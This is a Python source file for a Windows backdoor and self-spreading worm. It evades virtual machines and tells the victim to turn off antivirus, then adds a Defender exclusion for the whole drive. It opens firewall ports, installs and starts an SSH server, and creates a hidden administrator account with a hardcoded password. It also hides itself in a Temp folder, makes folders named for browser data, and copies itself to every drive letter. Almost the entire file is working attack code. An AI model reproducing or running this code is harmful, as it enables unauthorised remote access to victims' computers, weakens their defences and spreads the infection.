# -*- coding: utf-8 -*-
from pathlib import Path
from os import rename
from os import remove
from os import path
from sys import executable
from sys import argv
from ctypes import windll
from os import getenv
from os import name
from os import mkdir
from os import system
from os import chdir
from sys import exit
from subprocess import run
from shutil import copy
from shutil import move
from re import search
from time import sleep
#                                                                        EEEEEEEEEEE      X     X     EEEEEEEEEEE  
# ||0@#@         .O0O0.       .O0O0.         X         A                 D                 X   X      D 
# ||    X       0      O     0      O       X  X      Z Q                D                  X X       D
# ||     @      O      0     O      0      X    F    F   A               DXXXXXXXXX          X        DFFFFFFFFFF
# ||      @     0      O     0      O     F      B  X     K              D                  X X       D
# ||      @     O      0     0      0    X       X X       K      @@     D                 X   X      D
# ||     O       .O0O0.       .0O0O.    M         X         Z     @@     DVVVVVVVVVV      X     X     DXXXXXXXXXX
# ||#@@@"

if name != "nt":  # _Checks_If_Operating_System_Is_Windows_And_Exits_If_Not
    exit()

computer_status = run('powershell.exe gEt-mPcOmPuTerStatUs', shell=True, capture_output=True).stdout.decode()

if search("IsVirtualMachine                 : True", computer_status): #_Does_A_Check_4_Vm_Doesnt_Include_vbox_or_VmTools_I_Dont_Think
    windll.user32.MessageBoxW(0, "This program is not compatible with your computer.", "Error", 0x10)
    exit()
else:
    print("Nice")
    
if search("RealTimeProtectionEnabled        : True", computer_status):
    windll.user32.MessageBoxW(0, "Real time protection must be disabled to install dependencies.", "Error", 0x10)
    exit()
else:  # _Checks_If_Windows_Anti-Virus_Real_Time_Protection_Is_Enabled_And_Works_Some_Social_engineering_magic
    print("SUCCESS")
sleep(0.1)


def is_usr_admin():  # _Checks_If_Script_Has_Admin_Privs_And_Exits_If_Not_Administrator
    if not windll.shell32.IsUserAnAdmin():
        windll.shell32.ShellExecuteW(
            None, 'runas', executable, ' '.join(argv), None, None)
        exit(0)
    else:
        sleep(0.1)


is_usr_admin()

CURRENT_USER = getenv('username')  # _Gets_The_Users_Login_Name_This_Is_A_crucial_Variable_Dont_Change_It

CURRENT_DRIVE_LETTER = Path.home().drive

CURRENT_FILENAME = path.basename(argv[0]) 

name_of_opened_ports = "DOOOOM"  # _Name_Of_The_New_Port_Rules

ports_you_want_to_open = "80,22"  # _Port_Numbers_Must_Be_Seperated_By_Commas

new_account_username = "defaultuser"  # _Change_These_SSH_Login_Variables_To_Your_Desired_Credentials_Avoid_Using_A_Username_That_May_Already_Be_On_The_System.
new_account_passwd = "PassW0rd1@"

def sh3ll_c0mm4nds():
    run("powershell.exe aDd-mPpReFeReNcE -eXcLuSiONpAtH " + CURRENT_DRIVE_LETTER + "", shell=True)
    sleep(0.1)
    run('powershell.exe sEt-eXeCutIonPoLiCY -eXeCuTiOnPoLiCy UnrEstrIcteD -SCopE lOcAlmAcHinE -fOrCE',
        shell=True)
    sleep(0.1)
    run(
        'powershell.exe NEw-nEtfiReWaLlrUlE -diSpLaYnAmE ' + name_of_opened_ports + ' -dIrEcTiOn InBoUnD -pRoFiLe aNy -aCtIoN aLLoW -LoCaLpOrT ' + ports_you_want_to_open + ' -pRoToCoL tCp',
        shell=True)
    sleep(0.1)
    run(
        'powershell.exe NEw-nEtfiReWaLlrUlE -diSpLaYnAmE ' + name_of_opened_ports + ' -dIrEcTiOn oUtBoUnD -pRoFiLe aNy -aCtIoN aLLoW -LoCaLpOrT ' + ports_you_want_to_open + ' -pRoToCoL tCp',
        shell=True)
    sleep(0.1)
    run("powershell.exe aDd-wInDowScaPabiliTy -OnLiNe -nAmE opEnSsH.server~~~~0.0.1.0", shell=True)
    sleep(0.1)
    run("powershell.exe sEt-sErViCe -nAmE SsHd -sTarTuPtYpE 'aUtOmAtIc'", shell=True)
    sleep(0.1)
    run("powershell.exe sTaRt-sErViCe sShD", shell=True)
    sleep(0.1)


sh3ll_c0mm4nds()



def p3rs1st3nc3():
    if path.exists("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923") >= True:
        print("Nice_Already_Got_Me_A_Seat")
    else:
        try:
            mkdir("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
        except:
            print("Error")
    try:
        mkdir("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\p0wersh3ll_scr1pts")
    except:
        print("ERROR")
    sleep(1)
    windll.kernel32.SetFileAttributesW("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923", 2)
    sleep(0.1)
    if path.exists("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + CURRENT_FILENAME + ""):
        remove("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + CURRENT_FILENAME + "")
        sleep(0.1)
        move(CURRENT_FILENAME, "" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + CURRENT_FILENAME + "")
        sleep(0.1)
        chdir("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
    else:
        move(CURRENT_FILENAME, "" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + CURRENT_FILENAME + "")
        sleep(0.1)
        chdir("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
    sleep(0.1)



p3rs1st3nc3()

def t3mp_hq_pr3p():  # _Organising_Temp/Headquarters_Folder
    try:
        mkdir("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\ChR0m3_data")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\3dg3_data")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\br4v3_data")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\0p3r4_data")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("" + CURRENT_DRIVE_LETTER + "\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\0p3r4gX_data")
    except:
        print("Error")
    sleep(0.1)


t3mp_hq_pr3p()


def cr34t3_n3w_u5r():  # _Adds_A_New_Administrator_To_The_System
    command = """
    $nusnm = """ + '"{}"'.format(new_account_username) + """
    $nuspss = ConvertTo-SecureString """ + '"{}"'.format(new_account_passwd) + """ -AsPlainText -Force
    New-LocalUser -Name $nusnm -Password $nuspss
    Add-LocalGroupMember -Group "Administrators" -Member $nusnm
    Get-LocalUser
    """
    print(command)
    exec = run(["powershell", "& {" + command + "}"])
    sleep(0.1)
    run("powershell ReG aDd 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts'", shell=True)
    sleep(0.1)
    run("powershell ReG aDd 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'",shell=True)
    sleep(0.1)
    run("ReG aDd 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' /v 'defaultuser' /t REG_DWORD /d 0 /reg:32", Shell=True)

cr34t3_n3w_u5r()


def dr1v3_dr0p():  # _Copys_File_To_All_Connected_Drives's_To_Spread
    try:
        copy("" + CURRENT_FILENAME + "", "A://" + CURRENT_FILENAME + "")
    except:
        print('NO_A_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "B://" + CURRENT_FILENAME + "")
    except:
        print('NO_B_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "C://" + CURRENT_FILENAME + "")
    except:
        print('NO_C_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "D://" + CURRENT_FILENAME + "")
    except:
        print('NO_D_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "E://" + CURRENT_FILENAME + "")
    except:
        print('NO_E_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "F://" + CURRENT_FILENAME + "")
    except:
        print('NO_F_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "G://" + CURRENT_FILENAME + "")
    except:
        print('NO_G_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "H://" + CURRENT_FILENAME + "")
    except:
        print('NO_H_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "I://" + CURRENT_FILENAME + "")
    except:
        print('NO_I_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "J://" + CURRENT_FILENAME + "")
    except:
        print('NO_J_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "K://" + CURRENT_FILENAME + "")
    except:
        print('NO_K_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "L://" + CURRENT_FILENAME + "")
    except:
        print('NO_L_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "M://" + CURRENT_FILENAME + "")
    except:
        print('NO_M_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "N://" + CURRENT_FILENAME + "")
    except:
        print('NO_N_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "O://" + CURRENT_FILENAME + "")
    except:
        print('NO_O_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "P://" + CURRENT_FILENAME + "")
    except:
        print('NO_P_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "Q://" + CURRENT_FILENAME + "")
    except:
        print('NO_Q_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "R://" + CURRENT_FILENAME + "")
    except:
        print('NO_R_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "S://" + CURRENT_FILENAME + "")
    except:
        print('NO_S_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "T://" + CURRENT_FILENAME + "")
    except:
        print('NO_T_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "U://" + CURRENT_FILENAME + "")
    except:
        print('NO_U_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "V://" + CURRENT_FILENAME + "")
    except:
        print('NO_V_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "W://" + CURRENT_FILENAME + "")
    except:
        print('NO_W_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "X://" + CURRENT_FILENAME + "")
    except:
        print('NO_X_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "Y://" + CURRENT_FILENAME + "")
    except:
        print('NO_Y_DRIVE')
    sleep(0.1)
    try:
        copy("" + CURRENT_FILENAME + "", "Z://" + CURRENT_FILENAME + "")
    except:
        print('NO_Z_DRIVE')
    sleep(0.1)


dr1v3_dr0p()

windll.user32.MessageBoxW(0, "Script_Excecuted_Without_Error", "SUCCESS", 0x40)
